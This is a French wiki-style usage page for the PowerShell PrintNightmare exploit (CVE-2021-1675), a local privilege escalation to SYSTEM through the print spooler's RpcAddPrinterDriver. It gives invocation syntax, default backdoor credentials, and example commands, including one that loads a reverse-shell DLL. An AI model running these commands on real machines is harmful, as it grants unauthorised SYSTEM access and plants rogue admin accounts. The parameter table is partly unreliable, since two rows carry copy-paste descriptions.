---
title: PrintNightmare
description: Version PowerShell de l'exploit en local uniquement. Qui permet à n'importe quel utilisateur sans le privilège SeLoadDriverPrivilege, d'ajouter des drivers d'impression à un système, et par conséquent d'exécuter du code en tant que NT AUTHORITY\SYSTEM.
published: true
date: 2024-08-25T12:46:47.310Z
tags: outil, windows, powershell
editor: markdown
dateCreated: 2024-08-23T14:32:14.312Z
---

# Introduction

Version PowerShell de l'exploit PrintNightmare en local uniquement. Utilisant une faille dans la fonction RpcAddPrinterDriver, qui permet à n'importe quel utilisateur sans le privilège SeLoadDriverPrivilege, d'ajouter des drivers d'impression à un système, et par conséquent d'exécuter du code en tant que NT AUTHORITY\SYSTEM.

> La fonction RpcAddPrinterDriver permet aux utilisateurs avec le privilège SeLoadDriverPrivilege d'ajouter des drivers sur des spouleurs distants.
> {.is-info}

> La version PowerShell de PrintNightmare est disponible au téléchargement [ici](https://github.com/calebstewart/CVE-2021-1675)
> {.is-info}

> Le canal nommé \pipe\spoolss est utilisé pour la communication.
> {.is-info}

# Syntaxe

`Import-Module .\cve-2021-1675.ps1`
`Invoke-Nightmare [paramètres]`

# Paramètres

| Paramètre                                      | Description                                                           |
| ---------------------------------------------- | --------------------------------------------------------------------- |
| `-DriverName <nom du driver à ajouter>`        | Spécifie le nom du driver (par défaut:"Totally Not Malicious").       |
| `-NewUser <nom de l'utilisateur>`              | Spécifie le nom du driver (par défaut:"adm1n").                       |
| `-NewPassword <mot de passe de l'utilisateur>` | Spécifie le nom du driver (par défaut:"P@ssw0rd").                    |
| `-DLL <chemin absolu du DLL>`                  | Spécifie le DLL à ajouter (non compatible avec les autres paramètres) |

# Exemples

Lancement avec un DLL personnalisé.
`Invoke-Nightmare -DLL "C:\temp\rshell.dll"`

Lancement avec mot de passe par "t00r_secure".
`Invoke-Nightmare -NewPassword "t00r_secure""`

# Voir aussi

le DLL par défaut utilisé pour ajouter un utilisateur:
https://github.com/calebstewart/CVE-2021-1675/blob/main/nightmare-dll/nightmare/dllmain.cpp

Fonction RpcAddPrinterDriver:
https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22

Emplacement et informations concernant le canal nommé \pipe\spoolss:
https://learn.microsoft.com/fr-fr/openspecs/windows_protocols/ms-rprn/fdf1138a-f6b9-4b00-ada6-1fbb6097d683
